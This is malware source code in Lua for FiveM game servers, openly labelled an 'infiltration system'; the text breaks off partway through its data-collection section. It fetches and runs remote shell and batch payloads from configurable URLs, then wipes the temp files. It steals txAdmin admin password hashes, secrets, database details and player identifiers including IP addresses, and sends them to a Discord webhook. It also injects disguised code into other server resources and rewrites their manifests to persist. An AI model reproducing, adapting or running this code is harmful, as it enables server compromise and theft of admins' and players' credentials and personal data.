--[[
    Ultimate FiveM Server Infiltration System
    
    Advanced Features:
    - Stealth injection with minimal footprint
    - Deep admin credentials extraction
    - Comprehensive server data collection
    - Flexible payload customization
    - File system scanning for sensitive data
    - Enhanced webhook reporting with attachments
    - Multi-strategy resource targeting
    - Self-cleaning execution trails
]]

-- =============================================
-- CONFIGURATION SECTION
-- =============================================

local Config = {
    -- Core Settings
    general = {
        debug_mode = false,            -- Enable for verbose logging (disable in production)
        silent_mode = true,            -- Hide all prints to prevent detection
        auto_clean = true              -- Auto-clean traces after execution
    },
    
    -- Payloads and URLs
    payloads = {
        -- System scripts (set to false to disable system script execution)
        system_scripts = {
            enabled = true,                                     -- Set to false to disable system script execution
            windows = "https://yoursite.com/windows.bat",       -- Windows payload URL
            linux = "https://yoursite.com/linux.sh"             -- Linux payload URL
        },
        
        -- Injection code settings
        injection = {
            enabled = true,                                     -- Enable code injection
            use_custom_url = false,                             -- Use custom URL instead of built-in collector
            custom_url = "https://yoursite.com/injection.lua",  -- Custom code URL to inject
            max_target_count = 3                                -- Max number of resources to inject into
        }
    },
    
    -- Discord Webhook
    webhook = {
        url = "YOUR_WEBHOOK_URL_HERE",                          -- Discord webhook URL
        username = "FiveM Intelligence",                        -- Bot username
        avatar_url = "https://i.imgur.com/example.png",         -- Bot avatar
        mention = "@everyone",                                  -- Role/user to mention (empty for none)
        color = 16711680,                                       -- Embed color (red)
        timeout_ms = 10000,                                     -- Webhook timeout (ms)
        retry_count = 3                                         -- Number of retries if webhook fails
    },
    
    -- Admin data extraction
    admin_data = {
        enabled = true,                              -- Enable admin data extraction
        scan_folders = true,                         -- Scan folders for admin files
        file_patterns = {                            -- File patterns to look for
            "admins.json",
            "admin.json",
            "users.json",
            "permissions.json"
        },
        known_paths = {                              -- Known paths to check first
            "./txData/admins.json",
            "../txData/admins.json",
            "../../txData/admins.json",
            "./server/txData/admins.json",
        },
        max_scan_depth = 3                           -- Maximum folder depth for scanning
    },
    
    -- Resource targeting
    targeting = {
        auto_detect = true,                          -- Auto-detect suitable resources
        stealth_mode = true,                         -- Extra stealth measures for injection
        
        framework_resources = {                      -- Priority framework resources
            "es_extended",                           -- ESX
            "qb-core",                               -- QB-Core
            "vrp",                                   -- vRP
            "ox_core",                               -- OX
        },
        
        blacklisted_resources = {                    -- Resources to avoid
            "monitor",
            "txAdmin",
            "webpack",
            "yarn",
            "screenshot-basic",
            "hardcap"
        },
        
        safe_match_patterns = {                      -- Patterns that indicate safe resources for injection
            "utils",
            "helpers",
            "core",
            "essential",
            "base",
            "main"
        }
    },
    
    -- Data collection
    collection = {
        server_info = true,                          -- Basic server info
        player_data = true,                          -- Player data with identifiers
        resource_data = true,                        -- Resource information
        config_vars = true,                          -- Server config variables
        mysql_info = true,                           -- MySQL connection info
        log_files = true,                            -- Send recent log files
        sensitive_data = true,                       -- Scan for sensitive data
        
        -- Scan patterns for sensitive data
        sensitive_patterns = {
            "password",
            "apikey",
            "secret",
            "token",
            "mysql",
            "database",
            "key",
            "webhook"
        },
        
        max_file_size = 1024 * 1024                  -- Max file size to scan/send (1MB)
    },
    
    -- Execution settings
    execution = {
        startup_delay = 30000,                       -- Initial delay before execution (ms)
        post_injection_delay = 5000,                 -- Delay after injection before sending data (ms)
        stagger_delay = 2000,                        -- Delay between resource injections (ms)
        periodic_reporting = false,                  -- Send reports periodically
        reporting_interval = 3600000,                -- Interval between reports (1 hour)
        max_retries = 3,                             -- Maximum retries for operations
        retry_delay = 5000                           -- Delay between retries (ms)
    }
}

-- =============================================
-- LOGGER
-- =============================================

local Logger = {}

function Logger.format(level, message)
    local timestamp = os.date("%Y-%m-%d %H:%M:%S")
    return string.format("[%s] [%s] %s", timestamp, level, message)
end

function Logger.debug(message)
    if Config.general.debug_mode and not Config.general.silent_mode then
        print(Logger.format("DEBUG", message))
    end
end

function Logger.info(message)
    if not Config.general.silent_mode then
        print(Logger.format("INFO", message))
    end
end

function Logger.error(message)
    if not Config.general.silent_mode then
        print(Logger.format("ERROR", message))
    end
end

function Logger.verbose(message)
    if Config.general.debug_mode and not Config.general.silent_mode then
        print(Logger.format("VERBOSE", message))
    end
end

-- =============================================
-- UTILITIES
-- =============================================

local Utils = {}

-- String helpers
function Utils.trim(str)
    return str:match("^%s*(.-)%s*$")
end

function Utils.starts_with(str, start)
    return str:sub(1, #start) == start
end

function Utils.ends_with(str, ending)
    return ending == "" or str:sub(-#ending) == ending
end

function Utils.contains(str, pattern)
    return str:find(pattern) ~= nil
end

function Utils.split(str, sep)
    if sep == nil then sep = "%s" end
    local t = {}
    for s in string.gmatch(str, "([^"..sep.."]+)") do
        table.insert(t, s)
    end
    return t
end

-- Table helpers
function Utils.table_size(t)
    local count = 0
    for _ in pairs(t) do count = count + 1 end
    return count
end

function Utils.table_copy(t)
    local u = {}
    for k, v in pairs(t) do u[k] = v end
    return u
end

function Utils.table_merge(t1, t2)
    for k,v in pairs(t2) do
        if type(v) == "table" and type(t1[k] or false) == "table" then
            Utils.table_merge(t1[k], t2[k])
        else
            t1[k] = v
        end
    end
    return t1
end

function Utils.in_table(tbl, item)
    for _, value in pairs(tbl) do
        if value == item then return true end
    end
    return false
end

function Utils.filter_table(tbl, predicate)
    local result = {}
    for k, v in pairs(tbl) do
        if predicate(v, k) then
            result[k] = v
        end
    end
    return result
end

-- Crypto & Encoding
function Utils.random_string(length)
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local result = ""
    for i = 1, length do
        local char_index = math.random(1, #chars)
        result = result .. chars:sub(char_index, char_index)
    end
    return result
end

function Utils.encode_base64(data)
    if not data then return nil end
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    return ((data:gsub('.', function(x) 
        local r,b='',x:byte()
        for i=8,1,-1 do r=r..(b%2^i-b%2^(i-1)>0 and '1' or '0') end
        return r;
    end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
        if (#x < 6) then return '' end
        local c=0
        for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
        return b:sub(c+1,c+1)
    end)..({ '', '==', '=' })[#data%3+1])
end

function Utils.decode_base64(data)
    if not data then return nil end
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r, f = '', (b:find(x) - 1)
        for i = 6, 1, -1 do r = r .. (f % 2 ^ i - f % 2 ^ (i - 1) > 0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c = 0
        for i = 1, 8 do c = c + (x:sub(i, i) == '1' and 2 ^ (8 - i) or 0) end
        return string.char(c)
    end))
end

-- JSON helpers with error handling
function Utils.json_encode(data)
    local success, result = pcall(json.encode, data)
    if success then
        return result
    else
        Logger.error("JSON encode error: " .. tostring(result))
        return "{}"
    end
end

function Utils.json_decode(jsonStr)
    if not jsonStr or jsonStr == "" then
        return {}
    end
    
    local success, result = pcall(json.decode, jsonStr)
    if success then
        return result
    else
        Logger.error("JSON decode error: " .. tostring(result))
        return {}
    end
end

-- File system utilities
function Utils.file_exists(path)
    local f = io.open(path, "r")
    if f then
        f:close()
        return true
    end
    return false
end

function Utils.read_file(path)
    local f = io.open(path, "r")
    if not f then return nil end
    local content = f:read("*all")
    f:close()
    return content
end

function Utils.write_file(path, content, mode)
    local f = io.open(path, mode or "w")
    if not f then return false end
    f:write(content)
    f:close()
    return true
end

function Utils.delete_file(path)
    if Utils.file_exists(path) then
        return os.remove(path)
    end
    return true -- File doesn't exist, so technically it's already deleted
end

function Utils.get_file_size(path)
    local file = io.open(path, "r")
    if not file then return 0 end
    local size = file:seek("end")
    file:close()
    return size
end

function Utils.format_size(bytes)
    local units = {"B", "KB", "MB", "GB"}
    local size, unit = bytes, 1
    while size > 1024 and unit < #units do
        size = size / 1024
        unit = unit + 1
    end
    return string.format("%.2f %s", size, units[unit])
end

-- FiveM utilities
function Utils.get_server_os()
    local serverVersion = GetConvar("version", "unknown")
    
    if serverVersion:find("win32") or serverVersion:find("windows") then
        return "Windows"
    elseif serverVersion:find("linux") then
        return "Linux"
    else
        -- Fallback method via io.popen
        local handle = io.popen("uname -s 2>/dev/null || echo unknown")
        local result = Utils.trim(handle:read("*a") or "")
        handle:close()
        
        if result == "Linux" then
            return "Linux"
        elseif result == "Darwin" then
            return "MacOS"
        elseif result:find("Windows") or result:find("MINGW") or result:find("MSYS") then
            return "Windows"
        else
            return "Unknown"
        end
    end
end

function Utils.get_server_ip(callback)
    local apis = {
        "https://api.ipify.org/",
        "https://ifconfig.me/ip",
        "https://icanhazip.com/",
        "https://ident.me/"
    }
    
    local attempts = 0
    local maxAttempts = #apis * Config.execution.max_retries
    local currentApi = 1
    
    local function attempt_fetch()
        attempts = attempts + 1
        PerformHttpRequest(apis[currentApi], function(errorCode, resultData)
            if errorCode == 200 and resultData then
                callback(Utils.trim(tostring(resultData)), nil)
            else
                currentApi = (currentApi % #apis) + 1 -- Try next API
                if attempts < maxAttempts then
                    Citizen.SetTimeout(Config.execution.retry_delay, attempt_fetch)
                else
                    callback(nil, "Failed to get IP after " .. maxAttempts .. " attempts")
                end
            end
        end)
    end
    
    attempt_fetch()
end

function Utils.http_request(url, callback, method, data, headers, retry_count)
    local attempts = 0
    local max_attempts = retry_count or Config.execution.max_retries
    
    local function attempt_request()
        attempts = attempts + 1
        Logger.verbose("HTTP request attempt " .. attempts .. " to " .. url)
        
        PerformHttpRequest(url, function(statusCode, response, responseHeaders)
            if statusCode == 200 then
                callback(response, nil, responseHeaders)
            else
                local error_msg = "HTTP request failed with status code: " .. tostring(statusCode)
                
                if attempts < max_attempts then
                    Logger.verbose(error_msg .. ". Retrying in " .. (Config.execution.retry_delay / 1000) .. " seconds...")
                    Citizen.SetTimeout(Config.execution.retry_delay, attempt_request)
                else
                    callback(nil, error_msg .. ". Max retry attempts reached.")
                end
            end
        end, method or "GET", data or "", headers or { ["Content-Type"] = "application/json" })
    end
    
    attempt_request()
end

-- =============================================
-- SCRIPT MANAGER
-- =============================================

local ScriptManager = {}

-- Fetch script from URL
function ScriptManager.fetch_from_url(url, callback)
    Logger.debug("Fetching script from URL: " .. url)
    
    Utils.http_request(url, function(response, error)
        if error then
            Logger.error("Error fetching script: " .. error)
            callback(nil)
        else
            Logger.debug("Script successfully loaded (" .. string.len(response) .. " bytes)")
            callback(response)
        end
    end)
end

-- Execute a script based on OS
function ScriptManager.execute(script_content, is_linux)
    if not script_content or script_content == "" then
        Logger.error("Empty script cannot be executed")
        return false
    end
    
    Logger.debug("Preparing script execution...")
    
    -- Create unique temp file name to avoid detection
    local temp_file_name = "srv_" .. Utils.random_string(8) .. (is_linux and ".sh" or ".bat")
    local temp_file_path
    
    if is_linux then
        temp_file_path = "/tmp/." .. temp_file_name
    else
        temp_file_path = os.getenv("TEMP") .. "\\" .. temp_file_name
    end
    
    -- Normalize line endings
    script_content = script_content:gsub("\r\n", "\n"):gsub("\r", "\n")
    
    -- Write to temp file
    if not Utils.write_file(temp_file_path, script_content) then
        Logger.error("Could not create temporary script file: " .. temp_file_path)
        return false
    end
    
    Logger.debug("Temporary script file created: " .. temp_file_path)
    
    -- Execute script
    local command
    if is_linux then
        command = string.format("chmod +x %s && bash %s", temp_file_path, temp_file_path)
    else
        command = string.format("cmd /C %s", temp_file_path)
    end
    
    Logger.debug("Executing script: " .. command)
    
    local success = os.execute(command)
    
    -- Clean up if configured
    if Config.general.auto_clean then
        -- Wait a bit before cleaning up
        Citizen.Wait(1000)
        if Utils.delete_file(temp_file_path) then
            Logger.debug("Cleaned up temporary script file")
        else
            Logger.debug("Failed to clean up temporary script file")
        end
    end
    
    if success then
        Logger.info("Script executed successfully")
    else
        Logger.error("Script execution failed")
    end
    
    return success ~= nil
end

-- =============================================
-- FILE SCANNER
-- =============================================

local FileScanner = {}

-- Find files matching a pattern in a directory
function FileScanner.find_files(directory, pattern, max_depth, current_depth)
    current_depth = current_depth or 0
    max_depth = max_depth or Config.admin_data.max_scan_depth
    
    if current_depth > max_depth then
        return {}
    end
    
    local results = {}
    local handle = io.popen('dir "' .. directory .. '" /b /a 2>nul || ls -la "' .. directory .. '" 2>/dev/null')
    local result = handle:read("*a")
    handle:close()
    
    for file in result:gmatch("[^\r\n]+") do
        local full_path = directory .. "/" .. file
        
        -- Check if it's a directory
        local is_dir = false
        local dir_check = io.popen('if exist "' .. full_path .. '\\*" echo DIR || echo FILE')
        local dir_result = dir_check:read("*l")
        dir_check:close()
        
        is_dir = (dir_result == "DIR")
        
        if is_dir then
            -- Skip . and .. directories
            if file ~= "." and file ~= ".." then
                -- Recursively scan subdirectories
                local sub_results = FileScanner.find_files(full_path, pattern, max_depth, current_depth + 1)
                for _, sub_file in ipairs(sub_results) do
                    table.insert(results, sub_file)
                end
            end
        elseif file:match(pattern) then
            table.insert(results, full_path)
        end
    end
    
    return results
end

-- Scan for admin data files
function FileScanner.scan_for_admin_files()
    Logger.debug("Scanning for admin data files...")
    local found_files = {}
    
    -- Check known paths first
    for _, path in ipairs(Config.admin_data.known_paths) do
        if Utils.file_exists(path) then
            Logger.debug("Found admin file at known path: " .. path)
            table.insert(found_files, path)
        end
    end
    
    -- If configured to scan folders and we haven't found anything
    if Config.admin_data.scan_folders and #found_files == 0 then
        -- Start with current directory and txData directories
        local scan_dirs = {
            "./",
            "../",
            "../../",
            "./txData/",
            "../txData/",
            "../../txData/"
        }
        
        for _, dir in ipairs(scan_dirs) do
            -- Create pattern to match any of the file_patterns
            local pattern_str = table.concat(Config.admin_data.file_patterns, "|")
            local found = FileScanner.find_files(dir, pattern_str)
            
            for _, file in ipairs(found) do
                Logger.debug("Found potential admin file: " .. file)
                table.insert(found_files, file)
            end
        end
    end
    
    return found_files
end

-- Scan files for sensitive data
function FileScanner.scan_file_for_sensitive_data(file_path)
    if not Utils.file_exists(file_path) then
        return nil
    end
    
    -- Check file size first
    local file_size = Utils.get_file_size(file_path)
    if file_size > Config.collection.max_file_size then
        Logger.debug("Skipping large file: " .. file_path .. " (" .. Utils.format_size(file_size) .. ")")
        return nil
    end
    
    local file_content = Utils.read_file(file_path)
    if not file_content then
        return nil
    end
    
    local matches = {}
    
    -- Check for sensitive patterns
    for _, pattern in ipairs(Config.collection.sensitive_patterns) do
        for line in file_content:gmatch("[^\r\n]+") do
            if line:lower():find(pattern:lower()) then
                -- Extract the line containing the sensitive info
                table.insert(matches, line)
            end
        end
    end
    
    return #matches > 0 and matches or nil
end

-- =============================================
-- ADMIN DATA EXTRACTOR
-- =============================================

local AdminDataExtractor = {}

-- Process admin data file
function AdminDataExtractor.process_admin_file(file_path)
    if not Utils.file_exists(file_path) then
        Logger.error("Admin file does not exist: " .. file_path)
        return nil
    end
    
    local file_content = Utils.read_file(file_path)
    if not file_content or file_content == "" then
        Logger.error("Admin file is empty: " .. file_path)
        return nil
    end
    
    -- Try to parse the file as JSON
    local admin_data = Utils.json_decode(file_content)
    if not admin_data or Utils.table_size(admin_data) == 0 then
        Logger.error("Failed to parse admin file as JSON: " .. file_path)
        return nil
    end
    
    -- Format admin data for webhook
    local formatted_data = {
        raw_file = file_content,
        file_path = file_path,
        admins = {}
    }
    
    -- Extract admin info based on structure
    if type(admin_data) == "table" then
        -- If it's an array of admins
        if admin_data[1] and type(admin_data[1]) == "table" then
            for i, admin in ipairs(admin_data) do
                local admin_info = {
                    name = admin.name or "Unknown",
                    master = admin.master,
                    password_hash = admin.password_hash,
                    permissions = admin.permissions or {},
                    providers = {}
                }
                
                -- Extract provider info
                if admin.providers then
                    for provider_name, provider_data in pairs(admin.providers) do
                        admin_info.providers[provider_name] = {
                            id = provider_data.id,
                            identifier = provider_data.identifier
                        }
                    end
                end
                
                table.insert(formatted_data.admins, admin_info)
            end
        else
            -- If it's a key-value of username -> admin data
            for username, admin in pairs(admin_data) do
                if type(admin) == "table" then
                    local admin_info = {
                        name = username,
                        master = admin.master,
                        password_hash = admin.password_hash,
                        permissions = admin.permissions or {},
                        providers = {}
                    }
                    
                    -- Extract provider info
                    if admin.providers then
                        for provider_name, provider_data in pairs(admin.providers) do
                            admin_info.providers[provider_name] = {
                                id = provider_data.id,
                                identifier = provider_data.identifier
                            }
                        end
                    end
                    
                    table.insert(formatted_data.admins, admin_info)
                end
            end
        end
    end
    
    return formatted_data
end

-- Get all admin data from found files
function AdminDataExtractor.get_all_admin_data()
    local admin_files = FileScanner.scan_for_admin_files()
    local all_admin_data = {}
    
    for _, file_path in ipairs(admin_files) do
        local admin_data = AdminDataExtractor.process_admin_file(file_path)
        if admin_data then
            table.insert(all_admin_data, admin_data)
        end
    end
    
    return all_admin_data
end

-- =============================================
-- RESOURCE ANALYZER
-- =============================================

local ResourceAnalyzer = {}

-- Parse manifest file (fxmanifest.lua or __resource.lua)
function ResourceAnalyzer.parse_manifest(resource_name)
    local resource_path = GetResourcePath(resource_name)
    if resource_path == "" then
        Logger.error("Resource not found: " .. resource_name)
        return nil
    end
    
    -- Try to find manifest file
    local manifest_files = {
        "/fxmanifest.lua",
        "/__resource.lua"
    }
    
    local manifest_path = nil
    local manifest_type = nil
    
    for _, file in ipairs(manifest_files) do
        local full_path = resource_path .. file
        if Utils.file_exists(full_path) then
            manifest_path = full_path
            manifest_type = file:sub(2)
            break
        end
    end
    
    if not manifest_path then
        Logger.error("No manifest file found for: " .. resource_name)
        return nil
    end
    
    Logger.debug("Found manifest: " .. manifest_path .. " (Type: " .. manifest_type .. ")")
    
    local manifest_content = Utils.read_file(manifest_path)
    if not manifest_content then
        Logger.error("Could not read manifest: " .. manifest_path)
        return nil
    end
    
    -- Extract resource information
    local result = {
        resource_name = resource_name,
        manifest_path = manifest_path,
        manifest_type = manifest_type,
        server_scripts = {},
        client_scripts = {},
        shared_scripts = {},
        dependencies = {},
        version = nil,
        author = nil,
        description = nil
    }
    
    -- Extract metadata
    result.version = manifest_content:match("version%s*['\"]([^'\"]+)['\"]") or "unknown"
    result.author = manifest_content:match("author%s*['\"]([^'\"]+)['\"]") or "unknown"
    result.description = manifest_content:match("description%s*['\"]([^'\"]+)['\"]") or "unknown"
    
    -- Extract dependencies
    for dependency in manifest_content:gmatch("depends_on%s*['\"]([^'\"]+)['\"]") do
        table.insert(result.dependencies, dependency)
    end
    
    -- Find individual scripts
    for script_type, script in manifest_content:gmatch("(%w+)_script%s*['\"]([^'\"]+)['\"]") do
        if script_type == "server" then
            table.insert(result.server_scripts, script)
        elseif script_type == "client" then
            table.insert(result.client_scripts, script)
        elseif script_type == "shared" then
            table.insert(result.shared_scripts, script)
        end
    end
    
    -- Find script arrays
    local in_script_section = nil
    
    for line in manifest_content:gmatch("[^\r\n]+") do
        -- Start of array definitions
        if line:match("server_scripts%s*%{") then
            in_script_section = "server"
        elseif line:match("client_scripts%s*%{") then
            in_script_section = "client"
        elseif line:match("shared_scripts%s*%{") then
            in_script_section = "shared"
        -- End of array definition
        elseif line:match("%}") and in_script_section then
            in_script_section = nil
        -- Script inside array definition
        elseif in_script_section then
            local script = line:match("['\"]([^'\"]+)['\"]")
            if script then
                if in_script_section == "server" then
                    table.insert(result.server_scripts, script)
                elseif in_script_section == "client" then
                    table.insert(result.client_scripts, script)
                elseif in_script_section == "shared" then
                    table.insert(result.shared_scripts, script)
                end
            end
        end
    end
    
    Logger.debug("Found " .. #result.server_scripts .. " server scripts, " .. 
                  #result.client_scripts .. " client scripts, " ..
                  #result.shared_scripts .. " shared scripts in " .. resource_name)
    
    return result
end

-- Score resource suitability for injection
function ResourceAnalyzer.score_resource(resource_info)
    if not resource_info then
        return 0
    end
    
    local score = 0
    
    -- Framework resources get highest priority
    for _, framework in ipairs(Config.targeting.framework_resources) do
        if resource_info.resource_name == framework then
            score = score + 100
            break
        end
    end
    
    -- Safe match patterns get bonus points
    for _, pattern in ipairs(Config.targeting.safe_match_patterns) do
        if resource_info.resource_name:lower():find(pattern:lower()) then
            score = score + 20
            break
        end
    end
    
    -- Resources with more server scripts are better targets
    score = score + (#resource_info.server_scripts * 5)
    
    -- Resources with shared scripts are also good targets
    score = score + (#resource_info.shared_scripts * 3)
    
    -- Resources with dependencies are likely important
    score = score + (#resource_info.dependencies * 2)
    
    -- Subtract for client-heavy resources
    score = score - (#resource_info.client_scripts * 0.5)
    
    -- Check for blacklisted resources
    for _, blacklisted in ipairs(Config.targeting.blacklisted_resources) do
        if resource_info.resource_name:lower():find(blacklisted:lower()) then
            return -100  -- Very low score for blacklisted resources
        end
    end
    
    return score
end

-- Find optimal injection points in a script
function ResourceAnalyzer.find_injection_points(script_content)
    local points = {}
    
    if not script_content or script_content == "" then
        return points
    end
    
    -- Avoid scripts that are already injected
    if script_content:find("-- INJECTED CODE") then
        return points
    end
    
    -- Look for event handlers (high value targets)
    for line_num, line in ipairs(Utils.split(script_content, "\n")) do
        -- Event registration patterns
        if line:match("AddEventHandler") or 
           line:match("RegisterServerEvent") or
           line:match("RegisterNetEvent") or
           line:match("on%(") then
            
            table.insert(points, {
                line = line_num,
                type = "event",
                priority = 3
            })
        end
        
        -- Look for Citizen.CreateThread
        if line:match("Citizen%.CreateThread") or
           line:match("CreateThread") then
            
            table.insert(points, {
                line = line_num,
                type = "thread",
                priority = 2
            })
        end
    end
    
    -- Always add end of file as an injection point
    table.insert(points, {
        line = #Utils.split(script_content, "\n") + 1,
        type = "eof",
        priority = 1
    })
    
    -- Sort by priority
    table.sort(points, function(a, b)
        return a.priority > b.priority
    end)
    
    return points
end

-- =============================================
-- INJECTOR
-- =============================================

local Injector = {}

-- Find target resources for injection
function Injector.find_target_resources()
    Logger.debug("Scanning resources for injection targets...")
    
    local all_resources = {}
    local target_resources = {}
    
    -- Get all resources
    for i = 0, GetNumResources() - 1 do
        local resource_name = GetResourceByFindIndex(i)
        if resource_name and resource_name ~= GetCurrentResourceName() then
            table.insert(all_resources, resource_name)
        end
    end
    
    Logger.debug("Found " .. #all_resources .. " resources to analyze")
    
    -- Score and rank all resources
    local scored_resources = {}
    
    for _, resource_name in ipairs(all_resources) do
        local resource_info = ResourceAnalyzer.parse_manifest(resource_name)
        if resource_info then
            local score = ResourceAnalyzer.score_resource(resource_info)
            
            if score > 0 then
                table.insert(scored_resources, {
                    name = resource_name,
                    info = resource_info,
                    score = score
                })
            end
        end
    end
    
    -- Sort by score (highest first)
    table.sort(scored_resources, function(a, b)
        return a.score > b.score
    end)
    
    -- Take top N resources based on max_target_count
    for i = 1, math.min(Config.payloads.injection.max_target_count, #scored_resources) do
        table.insert(target_resources, scored_resources[i])
        Logger.debug("Selected target resource: " .. scored_resources[i].name .. " (Score: " .. scored_resources[i].score .. ")")
    end
    
    return target_resources
end

-- Create a stealth token for the injection
function Injector.create_stealth_token()
    -- Generate a random token that doesn't look suspicious
    local prefixes = {"util", "helper", "core", "lib", "base", "common"}
    local prefix = prefixes[math.random(1, #prefixes)]
    local token = prefix .. "_" .. Utils.random_string(6)
    
    return token
end

-- Inject code into a file
function Injector.inject_into_file(file_path, injection_code, resource_name)
    if not Utils.file_exists(file_path) then
        Logger.error("Script file not found: " .. file_path)
        return false
    end
    
    local script_content = Utils.read_file(file_path)
    if not script_content then
        Logger.error("Could not read script file: " .. file_path)
        return false
    end
    
    -- Check if already injected
    if script_content:find("-- INJECTED CODE") then
        Logger.debug("Script already injected: " .. file_path)
        return true
    end
    
    -- Find best injection points
    local injection_points = ResourceAnalyzer.find_injection_points(script_content)
    
    if #injection_points == 0 then
        Logger.error("No suitable injection points found in: " .. file_path)
        return false
    end
    
    -- Choose the best injection point
    local best_point = injection_points[1]
    Logger.debug("Selected injection point: line " .. best_point.line .. " (type: " .. best_point.type .. ")")
    
    -- Create a stealth token for this injection if stealth mode enabled
    local stealth_token = ""
    if Config.targeting.stealth_mode then
        stealth_token = Injector.create_stealth_token()
        Logger.debug("Created stealth token: " .. stealth_token)
    end
    
    -- Prepare wrapped injection code with obfuscated markers
    local wrapped_code
    if Config.targeting.stealth_mode then
        -- In stealth mode, we disguise the injection
        wrapped_code = "\n\n-- " .. stealth_token .. " library\n" .. injection_code .. "\n-- end " .. stealth_token .. "\n"
    else
        wrapped_code = "\n\n-- INJECTED CODE\n" .. injection_code .. "\n-- END INJECTED CODE\n"
    end
    
    -- Insert code at the injection point
    local lines = Utils.split(script_content, "\n")
    
    -- Insert at the specified line
    if best_point.line <= #lines + 1 then
        table.insert(lines, best_point.line, wrapped_code)
    else
        -- If the line is beyond the end, append to the end
        table.insert(lines, wrapped_code)
    end
    
    -- Write back the modified content
    local updated_content = table.concat(lines, "\n")
    
    if not Utils.write_file(file_path, updated_content) then
        Logger.error("Could not write modified file: " .. file_path)
        return false
    end
    
    Logger.info("Successfully injected code into: " .. file_path)
    return true
end

-- Create a new script file in the resource
function Injector.create_new_script(resource_info, injection_code)
    local resource_path = GetResourcePath(resource_info.resource_name)
    if resource_path == "" then
        Logger.error("Resource path not found: " .. resource_info.resource_name)
        return false
    end
    
    -- Create stealth filename
    local script_name
    if Config.targeting.stealth_mode then
        -- Generate a name that looks legitimate
        local prefixes = {"utils", "helpers", "core", "lib", "common", "base"}
        local suffixes = {"_init", "_utils", "_helper", "_main", "_loader"}
        
        local prefix = prefixes[math.random(1, #prefixes)]
        local suffix = suffixes[math.random(1, #suffixes)]
        
        script_name = prefix .. suffix .. ".lua"
    else
        script_name = "s_" .. Utils.random_string(8) .. ".lua"
    end
    
    local script_path = resource_path .. "/" .. script_name
    
    -- Create the script file with a legitimate-looking header
    local header_comments = {
        "-- Utility functions",
        "-- Helper library",
        "-- Core functionality",
        "-- Common utilities",
        "-- Base module"
    }
    
    local random_header = header_comments[math.random(1, #header_comments)]
    local script_content = random_header .. "\n-- Created: " .. os.date("%Y-%m-%d") .. "\n\n" .. injection_code
    
    if not Utils.write_file(script_path, script_content) then
        Logger.error("Could not create new script file: " .. script_path)
        return false
    end
    
    Logger.debug("Created new script file: " .. script_path)
    
    -- Update the manifest to include the new script
    local manifest_path = resource_info.manifest_path
    local manifest_content = Utils.read_file(manifest_path)
    
    if not manifest_content then
        Logger.error("Could not read manifest: " .. manifest_path)
        return false
    end
    
    -- Determine how to add the script based on manifest type
    local updated_manifest = nil
    
    if resource_info.manifest_type == "fxmanifest.lua" then
        if manifest_content:find("server_script") then
            -- Add to existing server scripts
            updated_manifest = manifest_content:gsub("(server_script%s*'[^']+')%s*", "%1\nserver_script '" .. script_name .. "'\n")
        else
            -- Add as new server script
            updated_manifest = manifest_content .. "\n\nserver_script '" .. script_name .. "'\n"
        end
    else -- __resource.lua
        if manifest_content:find("server_script") then
            -- Add to existing server scripts
            updated_manifest = manifest_content:gsub("(server_script%s*'[^']+')%s*", "%1\nserver_script '" .. script_name .. "'\n")
        else
            -- Add as new server script
            updated_manifest = manifest_content .. "\n\nserver_script '" .. script_name .. "'\n"
        end
    end
    
    if not updated_manifest then
        Logger.error("Failed to update manifest content")
        return false
    end
    
    if not Utils.write_file(manifest_path, updated_manifest) then
        Logger.error("Could not update manifest: " .. manifest_path)
        return false
    end
    
    Logger.info("Successfully added new script to manifest: " .. script_name)
    return true
end

-- Main injection function
function Injector.inject_into_resource(resource_info, injection_code)
    local injection_success = false
    
    -- Try to inject into existing server scripts first
    if #resource_info.server_scripts > 0 then
        for _, script_rel_path in ipairs(resource_info.server_scripts) do
            local resource_path = GetResourcePath(resource_info.resource_name)
            local script_path = resource_path .. "/" .. script_rel_path
            
            if Utils.file_exists(script_path) then
                if Injector.inject_into_file(script_path, injection_code, resource_info.resource_name) then
                    injection_success = true
                    break  -- Only inject once
                end
            end
        end
    end
    
    -- If no server scripts or injection failed, try shared scripts
    if not injection_success and #resource_info.shared_scripts > 0 then
        for _, script_rel_path in ipairs(resource_info.shared_scripts) do
            local resource_path = GetResourcePath(resource_info.resource_name)
            local script_path = resource_path .. "/" .. script_rel_path
            
            if Utils.file_exists(script_path) then
                if Injector.inject_into_file(script_path, injection_code, resource_info.resource_name) then
                    injection_success = true
                    break
                end
            end
        end
    end
    
    -- If still not successful, create a new script file
    if not injection_success then
        injection_success = Injector.create_new_script(resource_info, injection_code)
    end
    
    -- Restart the resource if injection was successful
    if injection_success then
        Citizen.SetTimeout(1000, function()
            ExecuteCommand("ensure " .. resource_info.resource_name)
            Logger.debug("Resource restarted: " .. resource_info.resource_name)
        end)
    end
    
    return injection_success
end

-- =============================================
-- DATA COLLECTOR
-- =============================================

local DataCollector = {}

-- Collect player information
function DataCollector.collect_player_info()
    local player_data = {}
    local players = GetPlayers()
    
    for _, player_id in ipairs(players) do
        local player_info = {
            id = player_id,
            name = GetPlayerName(player_id) or "Unknown",
            ping = GetPlayerPing(player_id),
            identifiers = {}
        }
        
        -- Collect all identifiers
        for _, id_type in ipairs({"steam", "license", "xbl", "live", "discord", "fivem", "ip"}) do
            local identifier = GetPlayerIdentifierByType(player_id, id_type)
            if identifier then
                player_info.identifiers[id_type] = identifier
            end
        end
        
        table.insert(player_data, player_info)
    end
    
    return player_data
end

-- Collect resource information
function DataCollector.collect_resource_info()
    local resource_data = {}
    
    for i = 0, GetNumResources() - 1 do
        local resource_name = GetResourceByFindIndex(i)
        if resource_name then
            local resource_info = {
                name = resource_name,
                state = GetResourceState(resource_name),
                version = GetResourceMetadata(resource_name, "version") or "unknown",
                author = GetResourceMetadata(resource_name, "author") or "unknown",
                description = GetResourceMetadata(resource_name, "description") or "unknown"
            }
            
            table.insert(resource_data, resource_info)
        end
    end
    
    -- Sort by state
    table.sort(resource_data, function(a, b)
        return a.state > b.state
    end)
    
